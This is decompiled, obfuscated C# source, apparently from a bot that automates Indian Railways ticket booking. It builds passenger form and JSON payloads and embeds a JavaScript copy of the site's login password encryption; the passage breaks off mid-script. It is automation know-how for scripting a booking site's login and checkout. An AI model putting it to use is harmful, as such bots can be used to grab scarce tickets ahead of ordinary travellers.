using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Windows.Forms;
using Microsoft.VisualBasic;

internal class Class21
{
	internal string string_0;

	internal string string_1;

	internal string string_2;

	internal string string_3;

	internal string string_4;

	internal string string_5;

	internal string string_6;

	internal string string_7;

	public static byte[] byte_0;

	internal Class21()
	{
	}

	internal Class21(string string_8, string string_9, string string_10, string string_11, bool bool_0)
	{
		string_0 = string_8;
		string_1 = string_9;
		string_2 = string_10;
		string_3 = string_11;
		if (bool_0)
		{
			string_4 = "SRCTZN";
		}
		else
		{
			string_4 = "";
		}
	}

	internal string method_0(int int_0, bool bool_0, bool bool_1, bool bool_2, bool bool_3, string string_8, string string_9, string string_10)
	{
		string text = "";
		string_8 = string_8.Replace(":0", ":" + int_0);
		string_9 = string_9.Replace(":0", ":" + int_0);
		string text2 = string_2.ToUpper();
		string text3 = text2;
		if (string_10 != "")
		{
			string[] array = string_10.Split(new string[1] { "&" }, StringSplitOptions.RemoveEmptyEntries);
			int num = Information.UBound(array);
			for (int i = 0; i <= num; i++)
			{
				string[] array2 = Strings.Split(array[i], "=");
				if (array2[0].Contains("M"))
				{
					text2 = text2.Replace("M", array2[1]);
				}
				else if (array2[0].Contains("F"))
				{
					text2 = text2.Replace("F", array2[1]);
				}
			}
		}
		string text4 = "&" + string_8 + "=" + string_0.Replace("-", "").Replace(' ', '+') + "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3ApsgnAge=" + string_1 + "&" + string_9 + "=" + text2.ToUpper() + "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AberthChoice=" + smethod_2(string_3);
		string text5 = "";
		if (bool_1)
		{
			text = ((!string.IsNullOrEmpty(string_5)) ? ("&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AfoodChoice=" + string_5[0]) : ("&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AfoodChoice=V"));
		}
		else if (bool_2)
		{
			text = "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AbedRollOpt=on";
		}
		bool flag = !string.IsNullOrEmpty(string_4) && bool_0;
		string text6 = "";
		if (flag)
		{
			int num2 = 0;
			try
			{
				num2 = int.Parse(string_1);
			}
			catch
			{
			}
			if (!bool_3 && ((text3 == "M" && num2 >= 60) || (text3 == "F" && num2 >= 58)))
			{
				text6 = (string.IsNullOrEmpty(string_4) ? ("&addPassengerForm%3Apsdetail%3A" + int_0 + "%3Aconcession=3") : ("&addPassengerForm%3Apsdetail%3A" + int_0 + "%3Aconcession=1"));
			}
		}
		string text7 = ((!bool_0) ? "" : "");
		if (string_0.Contains("-"))
		{
			text5 = "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AchildBerthOpt=on";
		}
		string text8 = "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3Anationality=IN&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AidCardType=NULL_IDCARD&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AidCardNumber=";
		if (!string.IsNullOrEmpty(string_6) && !string_6.Contains("-IN"))
		{
			text8 = "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3Anationality=" + string_6.Substring(string_6.IndexOf('-') + 1) + "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AidCardType=PASSPORT&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AidCardNumber=" + string_7;
		}
		return text4 + text + text6 + text7 + text5 + text8;
	}

	internal string method_1(int int_0)
	{
		return "&addPassengerForm%3AchildInfoTable%3A" + int_0 + "%3AinfantName=" + string_0.Replace(' ', '+') + "&addPassengerForm%3AchildInfoTable%3A" + int_0 + "%3AinfantAge=" + string_1 + "&addPassengerForm%3AchildInfoTable%3A" + int_0 + "%3AinfantGender=" + string_2;
	}

	internal static string smethod_0(int int_0, bool bool_0, bool bool_1, string string_8, string string_9)
	{
		string text = "";
		string_8 = string_8.Replace(":0", ":" + int_0);
		string_9 = string_9.Replace(":0", ":" + int_0);
		string text2 = "&" + string_8 + "=&addPassengerForm%3Apsdetail%3A" + int_0 + "%3ApsgnAge=&" + string_9 + "=+&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AberthChoice=++";
		if (bool_1)
		{
			text = "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AfoodChoice=+";
		}
		object obj = ((!bool_0) ? "" : "");
		object obj2 = "&addPassengerForm%3Apsdetail%3A" + int_0 + "%3Anationality=IN&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AidCardType=NULL_IDCARD&addPassengerForm%3Apsdetail%3A" + int_0 + "%3AidCardNumber=";
		return string.Concat(text2, text, obj, obj2);
	}

	internal static string smethod_1(int int_0)
	{
		return "&addPassengerForm%3AchildInfoTable%3A" + int_0 + "%3AinfantName=&addPassengerForm%3AchildInfoTable%3A" + int_0 + "%3AinfantAge=-1&addPassengerForm%3AchildInfoTable%3A" + int_0 + "%3AinfantGender=+";
	}

	internal static string smethod_2(string string_8)
	{
		string text = string_8.ToUpper();
		switch (Class46.smethod_0(text))
		{
		case 879771736u:
			if (text == "MIDDLE")
			{
				return "MB";
			}
			break;
		case 207187383u:
			if (text == "SIDE LOWER")
			{
				return "SL";
			}
			break;
		case 1727073423u:
			if (text == "SIDE MIDDLE")
			{
				return "SM";
			}
			break;
		case 977910062u:
			if (text == "WINDOW SEAT")
			{
				return "WS";
			}
			break;
		case 1902112077u:
		{
			bool flag = text == "NO CHOICE";
			return "++";
		}
		case 2283022902u:
			if (text == "SIDE UPPER")
			{
				return "SU";
			}
			break;
		case 2906723303u:
			if (text == "UPPER")
			{
				return "UB";
			}
			break;
		case 2515996122u:
			if (text == "LOWER")
			{
				return "LB";
			}
			break;
		}
		return "++";
	}

	public string method_2(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = int_0;
		int_0++;
		int num2 = int.Parse(string_1);
		string text = "false";
		if (string_0.Contains("-"))
		{
			text = "true";
		}
		if ((num2 < 12) & (string_8 == "PT"))
		{
			text = "true";
		}
		if ((num2 < 12) & (text != "true"))
		{
			int_0--;
		}
		bool flag = text != "true";
		string text2 = "false";
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			text2 = "true";
		}
		string text3 = "\"passengerFoodChoice\":null";
		if (bool_1)
		{
			string text4 = "V";
			text3 = "\"passengerFoodChoice\":\"" + text4 + "\"";
		}
		string text5 = "\"passengerBedrollChoice\":null";
		if (bool_2)
		{
			text5 = "\"passengerBedrollChoice\":true";
		}
		string text6 = "\"concessionOpted\":false";
		string text7 = "\"forGoConcessionOpted\":false";
		if (text2 == "true")
		{
			text6 = "\"concessionOpted\":true";
			text7 = "\"forGoConcessionOpted\":false";
		}
		return string.Concat(new object[52]
		{
			"{\"bookingBerthCode\":null,",
			"\"bookingBerthNo\":0,",
			"\"bookingCoachId\":null,",
			"\"bookingStatus\":null,",
			"\"bookingStatusDetails\":null,",
			"\"bookingStatusIndex\":0,",
			"\"cardIssueDate\":null,",
			"\"childBerthFlag\":" + text + ",",
			"\"childPassenger\":null,",
			text6 + ",",
			"\"currentBerthChoice\":null,",
			"\"currentBerthCode\":null,",
			"\"currentBerthNo\":0,",
			"\"currentCoachId\":null,",
			"\"currentStatus\":null,",
			"\"currentStatusDetails\":null,",
			"\"currentStatusIndex\":0,",
			"\"dateOfBirth\":null,",
			"\"error\":null,",
			"\"foodChoice\":null,",
			text7 + ",",
			"\"insuranceIssued\":null,",
			"\"memberType\":null,",
			"\"mpID\":null,",
			"\"passengerAge\":" + string_1 + ",",
			text5 + ",",
			"\"passengerBerthChoice\":\"" + smethod_3(string_3) + "\",",
			"\"passengerCancellationDate\":null,",
			"\"passengerCardNumber\":null,",
			"\"passengerCardType\":null,",
			"\"passengerConcCardNo\":null,",
			"\"passengerConcession\":null,",
			"\"passengerDynamicFare\":null,",
			text3 + ",",
			"\"passengerForceNumber\":null,",
			"\"passengerGender\":\"" + string_2.ToUpper() + "\",",
			"\"passengerIcardFlag\":false,",
			"\"passengerName\":\"" + string_0.Replace("-", "") + "\",",
			"\"passengerNationality\":\"IN\",",
			"\"passengerNetFare\":null,",
			"\"passengerSerialNumber\":" + num + ",",
			"\"policyNumber\":null,",
			"\"psgnAmountDeducted\":null,",
			"\"psgnAmountRefunded\":null,",
			"\"psgnConcCardExpiryDate\":null,",
			"\"psgnConcCardId\":\"\",",
			"\"psgnConcDOB\":null,",
			"\"psgnConcType\":null,",
			"\"psgnwlType\":0,",
			"\"secretariatType\":null,",
			"\"softMemberFlag\":null,",
			"\"softMemberId\":null}"
		});
	}

	public string method_3(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = 1;
		int num2 = int.Parse(string_1);
		string text = "false";
		string text2 = "false";
		if (string_0.Contains("-"))
		{
			text = "true";
		}
		if ((num2 < 12) & (string_8 == "PT"))
		{
			text = "true";
		}
		if ((num2 < 12) & (text != "true"))
		{
			num--;
		}
		string text3 = ",\"childBerthFlag\":true";
		if (text != "true")
		{
			text3 = ",\"childBerthFlag\":false";
		}
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			text2 = "true";
		}
		string text4 = "";
        if (bool_1)
		{
			if (!string.IsNullOrEmpty(string_5))
			{
				if (string_5 == "No Food")
				{
					text4 = ",\"passengerFoodChoice\":\"D\"";
				}
				else if (string_5 == "Veg")
				{
					text4 = ",\"passengerFoodChoice\":\"V\"";
				}
				else if (string_5 == "Non-Veg")
				{
					text4 = ",\"passengerFoodChoice\":\"N\"";
				}
			}
			else
			{
				text4 = ",\"passengerFoodChoice\":\"D\"";
			}
		}
		string text5 = ",\"passengerBedrollChoice\":null";
		if (bool_2)
		{
			text5 = ",\"passengerBedrollChoice\":true";
		}
		string result = "";
		string text6 = "";
		string text7 = "";
		if (text2 == "true")
		{
			text6 = ",\"concessionOpted\":true";
			text7 = ",\"passengerSrCtznConcession\":\"1\"";
		}
		if (!string.IsNullOrEmpty(string_0.Replace("-", "")))
		{
			result = "{\"passengerName\":\"" + string_0.Replace("-", "") + "\",\"passengerAge\":" + string_1 + ",\"passengerGender\":\"" + string_2 + "\",\"passengerBerthChoice\":\"" + smethod_3(string_3) + "\"" + text4 + text7 + text5 + ",\"passengerNationality\":\"IN\",\"passengerCardTypeMaster\":\"null\",\"passengerCardNumberMaster\":null,\"psgnConcType\":null,\"psgnConcCardId\":null,\"psgnConcDOB\":null,\"psgnConcCardExpiryDate\":null,\"psgnConcDOBP\":null,\"softMemberId\":null,\"softMemberFlag\":null,\"psgnConcCardExpiryDateP\":null,\"passengerVerified\":false,\"masterPsgnId\":null,\"mpMemberFlag\":null,\"passengerForceNumber\":null,\"passConcessionType\":\"0\",\"passUPN\":null,\"passBookingCode\":null,\"passengerSerialNumber\":" + int_0 + text6 + text3 + ",\"passengerCardType\":\"NULL_IDCARD\",\"passengerIcardFlag\":false,\"passengerCardNumber\":null}";
		}
		return result;
	}

	public string method_3_app(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = 1;
		int num2 = int.Parse(string_1);
		string text = "false";
		string text2 = "false";
		if (string_0.Contains("-"))
		{
			text = "true";
		}
		if ((num2 < 12) & (string_8 == "PT"))
		{
			text = "true";
		}
		if ((num2 < 12) & (text != "true"))
		{
			num--;
		}
		string text3 = ",\"childBerthFlag\":true";
		if (text != "true")
		{
			text3 = ",\"childBerthFlag\":false";
		}
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			text2 = "true";
		}
		string text4 = "null";
		if (bool_1)
		{
			if (!string.IsNullOrEmpty(string_5))
			{
				if (string_5 == "No Food")
				{
					text4 = "\"D\"";
				}
				else if (string_5 == "Veg")
				{
					text4 = "\"V\"";
				}
				else if (string_5 == "Non-Veg")
				{
					text4 = "\"N\"";
				}
			}
			else
			{
				text4 = "\"D\"";
			}
		}
		string text5 = "false";
		if (bool_2)
		{
			text5 = "true";
		}
		string result = "";
		string text6 = "";
		string text7 = "";
		if (text2 == "true")
		{
			text6 = ",\"concessionOpted\":true";
			text7 = ",\"passengerSrCtznConcession\":\"1\"";
		}
		if (!string.IsNullOrEmpty(string_0.Replace("-", "")))
		{
			result = "{\"berth_class_I\":null,\"berth_class_II\":null,\"bookingBerthCode\":null,\"bookingBerthNo\":0,\"bookingCoachId\":null,\"bookingStatus\":null,\"bookingStatusCode\":null,\"bookingStatusDetails\":null,\"bookingStatusIndex\":0,\"cardIssueDate\":null" + text3 + ",\"childPassenger\":null" + text6 + ",\"currentBerthChoice\":null,\"currentBerthCode\":null,\"currentBerthNo\":0,\"currentCoachId\":null,\"currentStatus\":null,\"currentStatusDetails\":null,\"currentStatusIndex\":0,\"dateOfBirth\":null,\"dropWaitlistFlag\":false,\"error\":null,\"fareChargedPercentage\":0,\"foodChoice\":null,\"forGoConcessionOpted\":false,\"hrmsTxnId\":null,\"insuranceIssued\":null,\"issuingAuthority\":null,\"issuingStation\":null,\"issuingZone\":null,\"memberType\":null,\"mpID\":null,\"passBookingCode\":null,\"passType\":null,\"passUPN\":null,\"passengerAge\":" + string_1 + ",\"passengerBedrollChoice\":\"" + text5 + "\",\"passengerBerthChoice\":null,\"passengerCancellationDate\":null,\"passengerCardNumber\":null,\"passengerCardType\":null,\"passengerConcession\":null,\"passengerDynamicFare\":null,\"passengerFoodChoice\":" + text4 + ",\"passengerForceNumber\":null,\"passengerGender\":\"" + string_2 + "\",\"passengerGenderCode\":null,\"passengerIcardFlag\":false,\"passengerName\":\"" + string_0.Replace("-", "") + "\",\"passengerNationality\":\"IN\",\"passengerNetFare\":null,\"passengerSerialNumber\":" + int_0 + ",\"paymentValue\":null,\"policyNumber\":null,\"psgnAmountDeducted\":null,\"psgnAmountRefunded\":null,\"psgnConcCardExpiryDate\":null,\"psgnConcCardId\":\"\",\"psgnConcDOB\":null,\"psgnConcType\":null,\"psgnwlType\":0,\"secretariatType\":null,\"softMemberFlag\":null,\"softMemberId\":null,\"validationFlag\":\"N\",\"verificationStatus\":0,\"verificationStatusString\":\" \"}";

        }
		return result;
	}

	internal static string smethod_3(string string_8)
	{
		string text = string_8.ToUpper();
		switch (Class46.smethod_0(text))
		{
		case 879771736u:
			if (text == "MIDDLE")
			{
				return "MB";
			}
			break;
		case 207187383u:
			if (text == "SIDE LOWER")
			{
				return "SL";
			}
			break;
		case 977910062u:
			return "";
		case 1727073423u:
			if (text == "SIDE MIDDLE")
			{
				return "SM";
			}
			break;
		case 1902112077u:
			return "";
		case 2283022902u:
			if (text == "SIDE UPPER")
			{
				return "SU";
			}
			break;
		case 2906723303u:
			if (text == "UPPER")
			{
				return "UB";
			}
			break;
		case 2515996122u:
			if (text == "LOWER")
			{
				return "LB";
			}
			break;
		}
		return "";
	}

	internal static string smethod_4(string string_8, string string_9)
	{
		string text = "<script type=\"text/javascript\">\n\tfunction encryptUsingJS(e, t, n) {\r\nvar e1;\r\nvar e2;\r\nvar i = function(i) {\r\n        var r;\r\n        r ='" + string_8 + "';\r\n        e1 = encrypt(\"password=\" + r, i);\r\n        for (var a = r.length, o = 0; a > o; o++) {\r\n            var s = r[o];\r\n                var d = r\r\n                  , u = 'ACCESS_CODE'\r\n                  , l = !0;\r\n                if (-1 != u.indexOf(\"ACCESS_CODE\")) {\r\n                    var p = d.length;\r\n                    p > 128 && (l = !1)\r\n                }\r\n                e2 = encrypt(\"password=\" + d + \"_SALT_COMPONENT_=\" + Math.random(), i);\r\n        }\r\n    }\r\n    ;\r\n    getPublicKeyFromServer(i, e)\r\n   return e1;\r\n}\r\nfunction getPublicKeyFromServer(e, t) {\r\n    var n = function(e, t, n) {\r\n        setMaxDigits(parseInt(n, 10)),\r\n        this.e = biFromHex(e),\r\n        this.m = biFromHex(t),\r\n        this.chunkSize = 2 * biHighIndex(this.m),\r\n        this.radix = 16,\r\n        this.barrett = new BarrettMu(this.m)\r\n    }\r\n      , i = '" + string_9 + "'\r\n      , r = i.split(\",\")[0]\r\n      , a = i.split(\",\")[1]\r\n      , o = i.split(\",\")[2]\r\n      , s = new n(r,a,o);\r\n    e(s)\r\n}\r\n\n\n    jCryption1 = function(t, n) {\r\n        var r = this;\r\n        r.$el = e(t);\r\n        r.el = t;\r\n        r.$el.data(\"jCryption\", r);\r\n        r.init = function() {\r\n            r.options = e.extend({}, e.jCryption.defaultOptions, n);\r\n            $encryptedElement = e(\"<input />\", {\r\n                type: \"hidden\",\r\n                name: r.options.postVariable\r\n            });\r\n            if (r.options.submitElement !== false)\r\n                var t = r.options.submitElement;\r\n            else\r\n                var t = r.$el.find(\":input:submit\");\r\n            t.bind(r.options.submitEvent, function() {\r\n                e(this).attr(\"disabled\", true);\r\n                if (r.options.beforeEncryption())\r\n                    e.jCryption.getKeys(r.options.getKeysURL, function(t) {\r\n                        e.jCryption.encrypt(r.$el.serialize(), t, function(t) {\r\n                            console.log(t);\r\n                            $encryptedElement.val(t);\r\n                            e(r.$el).find(\":input\").attr(\"disabled\", true).end().append($encryptedElement).submit()\r\n                        })\r\n                    });\r\n                return false\r\n            })\r\n        }\r\n        ;\r\n        r.init()\r\n    }\r\n    ;\r\n    getKeys = function(t, n) {\r\n        var r = function(e, t, n) {\r\n            setMaxDigits(parseInt(n, 10));\r\n            this.e = biFromHex(e);\r\n            this.m = biFromHex(t);\r\n            this.chunkSize = 2 * biHighIndex(this.m);\r\n            this.radix = 16;\r\n            this.barrett = new BarrettMu(this.m)\r\n        }\r\n        ;\r\n        e.getJSON(t, function(t) {\r\n            keys = new r(t.e,t.n,t.maxdigits);\r\n            if (e.isFunction(n))\r\n                n.call(this, keys)\r\n        })\r\n    }\r\n    ;\r\n    encrypt = function(t, n) {\r\n        function h(t) {\r\n            function f() {\r\n                u = new BigInt;\r\n                o = 0;\r\n                for (var l = s; l < s + n.chunkSize; ++o) {\r\n                    u.digits[o] = t[l++];\r\n                    u.digits[o] += t[l++] << 8\r\n                }\r\n                var c = n.barrett.powMod(u, n.e);\r\n                var h = n.radix == 16 ? biToHex(c) : biToString(c, n.radix);\r\n            return h;\r\n            }\r\n            var s = 0;\r\n            var o, u;\r\n            var a = \"\";\r\n            var j=f()\r\nreturn j;\r\n        }\r\n        var s = 0;\r\n        for (var o = 0; o < t.length; o++)\r\n            s += t.charCodeAt(o);\r\n        var u = \"0123456789abcdef\";\r\n        var a = \"\";\r\n        a += u.charAt((s & 240) >> 4) + u.charAt(s & 15);\r\n        var f = a + t;\r\n        var l = [];\r\n        var c = 0;\r\n        while (c < f.length) {\r\n            l[c] = f.charCodeAt(c);\r\n            c++\r\n        }\r\n        while (l.length % n.chunkSize !== 0)\r\n            l[c++] = 0;\r\n        var y = h(l)\r\nreturn y;\r\n    }\r\n    ;\r\n    defaultOptions = {\r\n        submitElement: false,\r\n        submitEvent: \"click\",\r\n        getKeysURL: \"/jsp/jc.jsp?generateKeypair=true\",\r\n        beforeEncryption: function() {\r\n            return true\r\n        },\r\n        postVariable: \"jCryption\"\r\n    };\r\n    jCryption2 = function(t) {\r\n        return this.each(function() {\r\n            new jCryption1(this,t)\r\n        })\r\n    }\r\n\n\n\nfunction setMaxDigits(e) {\r\n    maxDigits = e;\r\n    ZERO_ARRAY = new Array(maxDigits);\r\n    for (var t = 0; t < ZERO_ARRAY.length; t++)\r\n        ZERO_ARRAY[t] = 0;\r\n    bigZero = new BigInt;\r\n    bigOne = new BigInt;\r\n    bigOne.digits[0] = 1\r\n}\r\nfunction BigInt(e) {\r\n    if (typeof e == \"boolean\" && e == true)\r\n        this.digits = null ;\r\n    else\r\n        this.digits = ZERO_ARRAY.slice(0);\r\n    this.isNeg = false\r\n}\r\nfunction biFromDecimal(e) {\r\n    var t = e.charAt(0) == \"-\";\r\n    var n = t ? 1 : 0;\r\n    var r;\r\n    while (n < e.length && e.charAt(n) == \"0\")\r\n        ++n;\r\n    if (n == e.length)\r\n        r = new BigInt;\r\n    else {\r\n        var i = e.length - n;\r\n        var s = i % dpl10;\r\n        if (s == 0)\r\n            s = dpl10;\r\n        r = biFromNumber(Number(e.substr(n, s)));\r\n        n += s;\r\n        while (n < e.length) {\r\n            r = biAdd(biMultiply(r, biFromNumber(1e15)), biFromNumber(Number(e.substr(n, dpl10))));\r\n            n += dpl10\r\n        }\r\n        r.isNeg = t\r\n    }\r\n    return r\r\n}\r\nfunction biCopy(e) {\r\n    var t = new BigInt(true);\r\n    t.digits = e.digits.slice(0);\r\n    t.isNeg = e.isNeg;\r\n    return t\r\n}\r\nfunction biFromNumber(e) {\r\n    var t = new BigInt;\r\n    t.isNeg = e < 0;\r\n    e = Math.abs(e);\r\n    var n = 0;\r\n    while (e > 0) {\r\n        t.digits[n++] = e & maxDigitVal;\r\n        e >>= biRadixBits\r\n    }\r\n    return t\r\n}\r\nfunction reverseStr(e) {\r\n    var t = \"\";\r\n    for (var n = e.length - 1; n > -1; --n)\r\n        t += e.charAt(n);\r\n    return t\r\n}\r\nfunction biToString(e, t) {\r\n    var n = new BigInt;\r\n    n.digits[0] = t;\r\n    var r = biDivideModulo(e, n);\r\n    var i = hexatrigesimalToChar[r[1].digits[0]];\r\n    while (biCompare(r[0], bigZero) == 1) {\r\n        r = biDivideModulo(r[0], n);\r\n        digit = r[1].digits[0];\r\n        i += hexatrigesimalToChar[r[1].digits[0]]\r\n    }\r\n    return (e.isNeg ? \"-\" : \"\") + reverseStr(i)\r\n}\r\nfunction biToDecimal(e) {\r\n    var t = new BigInt;\r\n    t.digits[0] = 10;\r\n    var n = biDivideModulo(e, t);\r\n    var r = String(n[1].digits[0]);\r\n    while (biCompare(n[0], bigZero) == 1) {\r\n        n = biDivideModulo(n[0], t);\r\n        r += String(n[1].digits[0])\r\n    }\r\n    return (e.isNeg ? \"-\" : \"\") + reverseStr(r)\r\n}\r\nfunction digitToHex(e) {\r\n    var t = 15;\r\n    var n = \"\";\r\n    for (i = 0; i < 4; ++i) {\r\n        n += hexToChar[e & t];\r\n        e >>>= 4\r\n    }\r\n    return reverseStr(n)\r\n}\r\nfunction biToHex(e) {\r\n    var t = \"\";\r\n    var n = biHighIndex(e);\r\n    for (var r = biHighIndex(e); r > -1; --r)\r\n        t += digitToHex(e.digits[r]);\r\n    return t\r\n}\r\nfunction charToHex(e) {\r\n    var t = 48;\r\n    var n = t + 9;\r\n    var r = 97;\r\n    var i = r + 25;\r\n    var s = 65;\r\n    var o = 65 + 25;\r\n    var u;\r\n    if (e >= t && e <= n)\r\n        u = e - t;\r\n    else if (e >= s && e <= o)\r\n        u = 10 + e - s;\r\n    else if (e >= r && e <= i)\r\n        u = 10 + e - r;\r\n    else\r\n        u = 0;\r\n    return u\r\n}\r\nfunction hexToDigit(e) {\r\n    var t = 0;\r\n    var n = Math.min(e.length, 4);\r\n    for (var r = 0; r < n; ++r) {\r\n        t <<= 4;\r\n        t |= charToHex(e.charCodeAt(r))\r\n    }\r\n    return t\r\n}\r\nfunction biFromHex(e) {\r\n    var t = new BigInt;\r\n    var n = e.length;\r\n    for (var r = n, i = 0; r > 0; r -= 4,\r\n    ++i)\r\n        t.digits[i] = hexToDigit(e.substr(Math.max(r - 4, 0), Math.min(r, 4)));\r\n    return t\r\n}\r\nfunction biFromString(e, t) {\r\n    var n = e.charAt(0) == \"-\";\r\n    var r = n ? 1 : 0;\r\n    var i = new BigInt;\r\n    var s = new BigInt;\r\n    s.digits[0] = 1;\r\n    for (var o = e.length - 1; o >= r; o--) {\r\n        var u = e.charCodeAt(o);\r\n        var a = charToHex(u);\r\n        var f = biMultiplyDigit(s, a);\r\n        i = biAdd(i, f);\r\n        s = biMultiplyDigit(s, t)\r\n    }\r\n    i.isNeg = n;\r\n    return i\r\n}\r\nfunction biDump(e) {\r\n    return (e.isNeg ? \"-\" : \"\") + e.digits.join(\" \")\r\n}\r\nfunction biAdd(e, t) {\r\n    var n;\r\n    if (e.isNeg != t.isNeg) {\r\n        t.isNeg = !t.isNeg;\r\n        n = biSubtract(e, t);\r\n        t.isNeg = !t.isNeg\r\n    } else {\r\n        n = new BigInt;\r\n        var r = 0;\r\n        var i;\r\n        for (var s = 0; s < e.digits.length; ++s) {\r\n            i = e.digits[s] + t.digits[s] + r;\r\n            n.digits[s] = i & 65535;\r\n            r = Number(i >= biRadix)\r\n        }\r\n        n.isNeg = e.isNeg\r\n    }\r\n    return n\r\n}\r\nfunction biSubtract(e, t) {\r\n    var n;\r\n    if (e.isNeg != t.isNeg) {\r\n        t.isNeg = !t.isNeg;\r\n        n = biAdd(e, t);\r\n        t.isNeg = !t.isNeg\r\n    } else {\r\n        n = new BigInt;\r\n        var r, i;\r\n        i = 0;\r\n        for (var s = 0; s < e.digits.length; ++s) {\r\n            r = e.digits[s] - t.digits[s] + i;\r\n            n.digits[s] = r & 65535;\r\n            if (n.digits[s] < 0)\r\n                n.digits[s] += biRadix;\r\n            i = 0 - Number(r < 0)\r\n        }\r\n        if (i == -1) {\r\n            i = 0;\r\n            for (var s = 0; s < e.digits.length; ++s) {\r\n                r = 0 - n.digits[s] + i;\r\n                n.digits[s] = r & 65535;\r\n                if (n.digits[s] < 0)\r\n                    n.digits[s] += biRadix;\r\n                i = 0 - Number(r < 0)\r\n            }\r\n            n.isNeg = !e.isNeg\r\n        } else\r\n            n.isNeg = e.isNeg\r\n    }\r\n    return n\r\n}\r\nfunction biHighIndex(e) {\r\n    var t = e.digits.length - 1;\r\n    while (t > 0 && e.digits[t] == 0)\r\n        --t;\r\n    return t\r\n}\r\nfunction biNumBits(e) {\r\n    var t = biHighIndex(e);\r\n    var n = e.digits[t];\r\n    var r = (t + 1) * bitsPerDigit;\r\n    var i;\r\n    for (i = r; i > r - bitsPerDigit; --i) {\r\n        if ((n & 32768) != 0)\r\n            break;\r\n        n <<= 1\r\n    }\r\n    return i\r\n}\r\nfunction biMultiply(e, t) {\r\n    var n = new BigInt;\r\n    var r;\r\n    var i = biHighIndex(e);\r\n    var s = biHighIndex(t);\r\n    var o, u, a;\r\n    for (var f = 0; f <= s; ++f) {\r\n        r = 0;\r\n        a = f;\r\n        for (j = 0; j <= i; ++j,\r\n        ++a) {\r\n            u = n.digits[a] + e.digits[j] * t.digits[f] + r;\r\n            n.digits[a] = u & maxDigitVal;\r\n            r = u >>> biRadixBits\r\n        }\r\n        n.digits[f + i + 1] = r\r\n    }\r\n    n.isNeg = e.isNeg != t.isNeg;\r\n    return n\r\n}\r\nfunction biMultiplyDigit(e, t) {\r\n    var n, r, i;\r\n    result = new BigInt;\r\n    n = biHighIndex(e);\r\n    r = 0;\r\n    for (var s = 0; s <= n; ++s) {\r\n        i = result.digits[s] + e.digits[s] * t + r;\r\n        result.digits[s] = i & maxDigitVal;\r\n        r = i >>> biRadixBits\r\n    }\r\n    result.digits[1 + n] = r;\r\n    return result\r\n}\r\nfunction arrayCopy(e, t, n, r, i) {\r\n    var s = Math.min(t + i, e.length);\r\n    for (var o = t, u = r; o < s; ++o,\r\n    ++u)\r\n        n[u] = e[o]\r\n}\r\nfunction biShiftLeft(e, t) {\r\n    var n = Math.floor(t / bitsPerDigit);\r\n    var r = new BigInt;\r\n    arrayCopy(e.digits, 0, r.digits, n, r.digits.length - n);\r\n    var i = t % bitsPerDigit;\r\n    var s = bitsPerDigit - i;\r\n    for (var o = r.digits.length - 1, u = o - 1; o > 0; --o,\r\n    --u)\r\n        r.digits[o] = r.digits[o] << i & maxDigitVal | (r.digits[u] & highBitMasks[i]) >>> s;\r\n    r.digits[0] = r.digits[o] << i & maxDigitVal;\r\n    r.isNeg = e.isNeg;\r\n    return r\r\n}\r\nfunction biShiftRight(e, t) {\r\n    var n = Math.floor(t / bitsPerDigit);\r\n    var r = new BigInt;\r\n    arrayCopy(e.digits, n, r.digits, 0, e.digits.length - n);\r\n    var i = t % bitsPerDigit;\r\n    var s = bitsPerDigit - i;\r\n    for (var o = 0, u = o + 1; o < r.digits.length - 1; ++o,\r\n    ++u)\r\n        r.digits[o] = r.digits[o] >>> i | (r.digits[u] & lowBitMasks[i]) << s;\r\n    r.digits[r.digits.length - 1] >>>= i;\r\n    r.isNeg = e.isNeg;\r\n    return r\r\n}\r\nfunction biMultiplyByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, 0, n.digits, t, n.digits.length - t);\r\n    return n\r\n}\r\nfunction biDivideByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, t, n.digits, 0, n.digits.length - t);\r\n    return n\r\n}\r\nfunction biModuloByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, 0, n.digits, 0, t);\r\n    return n\r\n}\r\nfunction biCompare(e, t) {\r\n    if (e.isNeg != t.isNeg)\r\n        return 1 - 2 * Number(e.isNeg);\r\n    for (var n = e.digits.length - 1; n >= 0; --n)\r\n        if (e.digits[n] != t.digits[n])\r\n            if (e.isNeg)\r\n                return 1 - 2 * Number(e.digits[n] > t.digits[n]);\r\n            else\r\n                return 1 - 2 * Number(e.digits[n] < t.digits[n]);\r\n    return 0\r\n}\r\nfunction biDivideModulo(e, t) {\r\n    var n = biNumBits(e);\r\n    var r = biNumBits(t);\r\n    var i = t.isNeg;\r\n    var s, o;\r\n    if (n < r) {\r\n        if (e.isNeg) {\r\n            s = biCopy(bigOne);\r\n            s.isNeg = !t.isNeg;\r\n            e.isNeg = false;\r\n            t.isNeg = false;\r\n            o = biSubtract(t, e);\r\n            e.isNeg = true;\r\n            t.isNeg = i\r\n        } else {\r\n            s = new BigInt;\r\n            o = biCopy(e)\r\n        }\r\n        return new Array(s,o)\r\n    }\r\n    s = new BigInt;\r\n    o = e;\r\n    var u = Math.ceil(r / bitsPerDigit) - 1;\r\n    var a = 0;\r\n    while (t.digits[u] < biHalfRadix) 